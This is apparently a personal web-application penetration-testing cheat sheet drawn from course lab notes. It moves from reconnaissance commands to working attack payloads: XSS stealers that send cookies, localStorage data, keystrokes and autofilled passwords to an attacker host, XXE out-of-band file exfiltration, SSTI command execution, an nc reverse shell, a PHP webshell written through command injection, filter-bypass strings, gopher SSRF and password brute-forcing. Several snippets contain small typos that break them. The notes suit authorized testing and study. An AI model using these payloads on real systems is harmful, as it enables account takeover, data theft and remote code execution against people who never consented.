# Web App Checklist
<br>

## Burp Setup

* Set up scope, exclude targets from scope if necessary
* Turn off cached responses (If None Match, If Modified Since)
* Turn on response interception if request was intercepted
* Set up extensions if applicable (Autorize, RetireJS, J2EE, Active Scan ++)

## Discovery
* export HOSTNAME='hostname'
* sudo nmap -v -sS -sV -Pn -A -oN nmap\_scan $HOSTNAME
    * add -p- for a full UDP/TCP port scan
* export URL='http:\/\/hostname' - Do this after nmap in case we need to enumerate a non standard web server port
* File / directory discovery 
    * gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 30
    * gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 30
    * gobuster dns -d $HOSTNAME -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 30
    * gobuster vhost -u $URL -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
    * nuclei -u $URL
    * wappalyzer (browser extension) or whatweb (whatweb https://example.com) for tech stack identification
    * Burp Scan (If applicable)
    * wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 301,404,403 http://site/FUZZ (<b>FOR DIRECTORIES</b> use raft-large-directories.txt)
    * dirsearch -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u URL --full-url (add -e extension such as -e php for specific extension targeting) (<b>FOR DIRECTORIES</b> use raft-large-directories.txt)
* Pw / Username discovery - cewl - `cewl -d 2 -m 5 -w docswords.txt https://example.com`

## Testing

* [ ] AuthZ
    * [ ] Load In multiple user roles (if applicable) and click through app in it's entirety, observe any responses in autorize
    * [ ] Vertical priv test
    * [ ] Lateral (sometimes this is only IDOR)
* [ ] Injection
    * [ ] SQLi
    * [ ] XSS
    * [ ] XXE (If applicable)
    * [ ] SSRF
    	* [ ] Templating language?
     	* [ ] Does the site encourage / accept URLs **AS** a parameter such as submitting a profile pic URL?
    * [ ] SSTI
    * [ ] EL Language
    * [ ] File Upload
    * [ ] Command Injection
* [ ] Business Logic Flaws
* [ ] Server Configs
    * [ ] CSRF
    * [ ] Info Disclosure - Fuzz All non destructive parameterized queries
    * [ ] LFI/Directory Traversal
    * [ ] Cookies?
        * [ ] HttpOnly and Secure set?
    * [ ] CSP Set Correctly?
    * [ ] HSTS Set Correctly?
* [ ] AuthN
    * [ ] Auth Bypass?
        * [ ] Bypass the auth flow?
        * [ ] Autorize should catch: Replay requests unauthenticated?
        * [ ] Bypass 2fa if enforced?
    * [ ] User Enumeration?
        * [ ] Forgot Password?
    * [ ] Token Re-Sign? (JWT Only)
    * [ ] Session Expiration?
    * [ ] Session Destruction on logout? (Stateful auth only)

### XSS (All code here is from the course material / notes)

<b>Remember ALL CODE CAN BE TESTED IN CONSOLE IN CASE OF DEBUGGING</b>

* Discovery
    * `<script>alert(1)</script>`
    * `<img src=foo http://yourip/xss.js"></script>`
* Cookie Stealer

```
let cookie = document.cookie
```

* From an external source (python webserver):
<b>xss.js</b>

let encodedCookie = encodeURIComponent(cookie)
fetch("http://yourIP/exfil?data=" + encodedCookie)
\`\`\`

```
Then reference this payload in your initial injection point ie`<script src="http://yourip/xss.js"></script>`
```

* Local Storage Secrets Stealer

``` letdata = JSON.stringify(localStorage) //can also use sessionStorage
let encodedData = encodeURIComponent(data)
```

* From an external source (python webserver):
<b>xss.js</b>

fetch("http://yourIP/exfil?data=" + encodedData)\`\`\`Then reference this payload in your initial injection point ie \`<script src=http://yourip/xss.js">\`\`\`\`

* Keylogger
Then reference this payload in your initial injection point ie `<script src="http://yourip/xss.js"></script>`

``` functionlogKey(event){
fetch("http://yourIP/k?key=" + event.key)}
```

* From an external source (python webserver):
<b>xss.js</b>

document.addEventListener('keydown', logKey);

* Stealing pw's from autofill prompts
    * From an external source (python webserver):
    <b>xss.js</b>

```
let body = document.getElementsByTagName("body")[0]
    var u = document.createElement("input");
    u.type = "text";
    u.style.position = "fixed";
    //u.style.opacity = "0";

    var p = document.createElement("input");
    p.type = "password";
   p.style.position = "fixed";
   //p.style.opacity = "0";
   body.append(u)
   body.append(p)
   setTimeout(function(){ 
           fetch("http://192.168.49.51/k?u=" + u.value + "&p=" + p.value)
    }, 5000);
```

Then reference this payload in your initial injection point ie `<script src="http://yourip/xss.js"></script>`

* All-in-one (Target all potential secrets if you dont know what you are after)
    * From an external source (python webserver):
    <b>xss.js</b>

```
let attacker = "http://yourip:80/exfil"

/* attach keylogger */
function logKey(event) {
        fetch(attacker + "?key=" + event.key)
}
document.addEventListener('keydown', logKey);

/* steal local storage */
let ls = encodeURIComponent(JSON.stringify(localStorage))
fetch(attacker + "?storage=" + ls)

/* steal cookies */
fetch(attacker + "?cookies=" + encodeURIComponent(document.cookie))
```

Then reference this payload in your initial injection point ie `<script src="http://yourip/xss.js"></script>`

<b>Remember if any of your payloads don't seem to work, take any script code you want to run and place it in the browser console to verify it's working</b>

### Cross Origin Attacks

No specific CSRF scenarios were ever encountered in the labs, however you may run into issues with CORS and self hosted payloads, such as external XSS.js files. The easiest way to fix this after much research is to use the http web server called Caddy

1. Install: sudo apt get install caddy
2. From within the directory where your xss.js file lives, create a file called Caddyfile
3. Contents of Caddyfile

```
http://yourip:80

file_server browse

header Access-Control-Allow-Origin *
header Access-Control-Allow-Methods *
header Access-Control-Allow-Headers *

log {
       output file caddylog
       format json
}
respond /exfil 200
```

Note that /exfil is the URL endpoint you want any cookie / secrets stealers to call back to

To host your xss.js file using Caddy, from within the directory that contains the Caddyfile and xss.js file run `caddy run`

Then to view any incoming requests / logs you can `cat caddylog` or to view just the pertinent information run `tail -f caddylog | jq '.request | del(.headers)'`

### SQLi

<b>wfuzz to test for sqli</b>
GET: `wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "$URL/index.php?id=FUZZ"`

POST: `wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "id=FUZZ" -u "$URL/index.php"`

If you need to add any cookies
`wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "id=FUZZ" -u "$URL/index.php" -H "Cookie: PHPSESSID=2feb03393e44b1d0c0f20a11f62a8d1f`
--hh hides content length specified
--hc hides status codes specified

<b>Sqlmap</b>
First, capture the request you are interested in via Burpsuite, send the request to repeater, right click on the request and select "Copy to file" give the file a name such as sqli\_login\_page

Next, run `sqlmap -r sqli_login_page -p param` where param is the parameter from the request youd like to inject into

Note: The labs indicate that if the host is Windows it is highly likely this will be your RCE vector via xp\_cmdshell

### Directory Traversal / LFI

```wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://site:80/index.php?path=../../../../../../../../../../FUZZ```

```wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 http://site:8080/test/../../../../../../../../../../../../FUZZ```

```wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 http://site:8080/test/FUZZ```

### XXE

If you see XML in ANY request, you should be testing for this

Wordlist to use in Burp Suite Intruder for fuzzing XXE: `/usr/share/seclists/Fuzzing/XXE-Fuzzing.txt`

<b>Out-of-Band Exploitation</b>

1. Create file named xxe.dtd with content:

``` xml
<!ENTITY % content SYSTEM "file:///etc/passwd">
<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://[kali-ip]/out?%content;'>" >
```

2. Serve file with http
3. Insert file in payload

``` xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE oob [
<!ENTITY % base SYSTEM "http://your ip address/external.dtd"> 
%base;
%external;
%exfil;
]>
<entity-engine-xml>
</entity-engine-xml>
```

4. Check incoming requests

Note that extracting file with multiple lines may not work due to encoding issues.

<b>Inline File Retrieval</b>

```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```

<b>Out of Band interaction (no file)</b>

```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "http://<our ip address>/somefile">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```

<b>String substitution - note you should have "Vulnerable to XXE" in the response</b>

```
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe "Vulnerable to XXE">
]>
<entity-engine-xml>
<Product createdStamp="2021-06-04 08:15:49.363" createdTxStamp="2021-06-04 08:15:48.983" description="Giant Widget with Wheels" internalName="Giant Widget variant explosion" isVariant="N" isVirtual="Y" largeImageUrl="/images/products/WG-9943/large.png" lastUpdatedStamp="2021-06-04 08:16:18.521" lastUpdatedTxStamp="2021-06-04 08:16:18.258" primaryProductCategoryId="202" productId="XXE-0001" productName="Giant Widget with variant explosion" productTypeId="FINISHED_GOOD" productWeight="22.000000" quantityIncluded="10.000000" smallImageUrl="/images/products/WG-9943/small.png" virtualVariantMethodEnum="VV_VARIANTTREE">
<longDescription>&xxe;</longDescription>
</Product>
</entity-engine-xml>
```

<b>Error based - placing XXE payload in a field that will cause an error, but will include the file in the error message</b>

```
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe  SYSTEM "file:///etc/passwd">
]>
<entity-engine-xml>
<Product createdTxStamp="2021-06-04 08:15:48.983" internalName="Giant Widget variant explosion" isVariant="N" isVirtual="Y" largeImageUrl="/images/products/WG-9943/large.png" lastUpdatedStamp="2021-06-04 08:16:18.521" lastUpdatedTxStamp="2021-06-04 08:16:18.258" primaryProductCategoryId="202" productId="XXE-0001" productName="Giant Widget with variant explosion" productTypeId="FINISHED_GOOD" productWeight="22.000000" quantityIncluded="10.000000" smallImageUrl="/images/products/WG-9943/small.png" virtualVariantMethodEnum="VV_VARIANTTREE">
<createdStamp>2021-06-04 08:15:49</createdStamp>
<description>&xxe;</description>
<longDescription>XXE</longDescription>
</Product>
</entity-engine-xml>
```

### SSTI

[Master List of SSTI Injection Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

<b>Fuzzing</b>

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

<b>Twig - feel free to use other php functions like exec instead of system</b>

```
{{[0]|reduce('system','whoami')}}
```

<b>Freemarker</b>

```
${"freemarker.template.utility.Execute"?new()("whoami")}
```

<b>Pug</b>

```
- var require = global.process.mainModule.require
= require('child_process').spawnSync('whoami').stdou
```

or

```
- var require = global.process.mainModule.require

= require('child_process').execSync('whoami')
```

<b>Jinja - No RCE Payloads discussed in the materials</b>
`{{config|pprint}}` will return sensitive data relating to a jinja project

<b>Mustache / Handlebars - does not natively support any sort of RCE</b>
<b>Can iterate over filesystem with the following</b>

```
{{#each (readdir "/etc")}}

	{{this}}

{{/each}}
```

Or read a single file via `{{read "/etc/passwd"}}`

### Command Injection

<b>Note: fuzz all params for this, every single time</b>
Fuzzing
`wfuzz -c -z file,"/usr/share/payloadsallthethings/Command Injection/Intruder/command-execution-unix.txt" --sc 200 "$URL/index.php?parameter=idFUZZ"`

"Safest" reverse shell

```
/bin/nc -nv [kali-ip] 4242 -e /bin/bash
```

[All Reverse Shell Options](https://gtfobins.github.io/#+reverse%20shell)

Command Concatenation

```
&&
||
`cmd`
$(cmd)
;cmd
```

Input sanitization dodging

```
wh$()oami
```

"Bogus cmd injection wordlist for fuzzing"

```
bogus
;id
|id
`id`
i$()d
;i$()d
|i$()d
FAIL||i$()d
&&id
&id
FAIL_INTENT|id
FAIL_INTENT||id
`sleep 5`
`sleep 10`
`id`
$(sleep 5)
$(sleep 10)
$(id)
;`echo 'aWQK' |base64 -d`
FAIL_INTENT|`echo 'aWQK' |base64 -d`
FAIL_INTENT||`echo 'aWQK' |base64 -d`
```

And then
`wfuzz -c -z file,/home/kali/command_injection_custom.txt --hc 404 http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1FUZZ`

Bypassing with base64 encode

```
kali@kali:~$ echo "cat /etc/passwd" | base64

Y2F0IC9ldGMvcGFzc3dkCg==
```

```
[http://ci-sandbox/php/blocklisted.php?ip=127.0.0.1;`echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22%20|base64%20-d`](http://ci-sandbox/php/blocklisted.php?ip=127.0.0.1;`echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22%20|base64%20-d`)
```

Simple PHP Webshell (Remember, if you are passing this through an http request, you need to encode!)

```
<pre><?php passthru($_GET['cmd']);?></pre>
```

From the larger example of

```
http://ci-sandbox:80/php/index.php?ip=127.0.0.1;echo+%22%3Cpre%3E%3C?php+passthru(\$_GET[%27cmd%27]);+?%3E%3C/pre%3E%22+%3E+/var/www/html/webshell.php
```

### SSRF

Testing for SSRF can be tricky and varies largely. Best bet is to start an http server on your kali box and use `http://yourIP/` as a parameter in all requests and see if you get any requests back. Remember to use apache2 to record incoming requests because it can log the user agent most readily.

<b>Retrieving data from local services:</b>
Try to insert `http://localhost` as a parameter (requires a non-blind SSRF) and see if you can enumerate some internal services on the host.

<b>Metadata on Cloud Services</b>

* 169.254.169.254
* metadata.google.internal
* metadata.web200.local(?)

<b>Alternative file schemes</b>

* file:/etc/passwd
* file:///etc/passwd
* file:///c:/windows/win.ini

<b>Gopher Protocol</b>
Requires the user agent to be curl, which is most easily determined via apache2 logs

Note: you need to double encode all special characters when manually crafting a gopher payload to send in burp

For example

```
gopher://127.0.0.1:80/_POST%20/status%20HTTP/1.1%0a
```

In burp now becomes

```
gopher%3a%2f%2f127.0.0.1%3a80%2f_POST%2520%2fstatus%2520HTTP%2f1.1%250a
```

Another post example to a fictitious login endpoint

```
cv=gopher://localhost:80/_POST%2520/login%2520HTTP/1.1%250aContent-Type%253a%2520application/x-www-form-urlencoded%250aContent-Length%253a%252032%250a%250ausername=admin%2526password=password
```

### IDOR

```
wfuzz -c -z range,1-100 --hc 404 "$URL/index.php?doc=FUZZ.txt"
wfuzz -c -z range,1-100 --hc 404 "$URL/index.php?doc=FUZZ"
```

### Username / PW Fuzzing

```
wfuzz -c -z file,/usr/share/SecLists/Usernames/top-username-shortlist.txt --hc 404,403 "$URL/login.php?user=FUZZ"
```

```
wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404,403 -d "username=admin&password=FUZZ" "$URL/login.php"
```
<br>
<br>
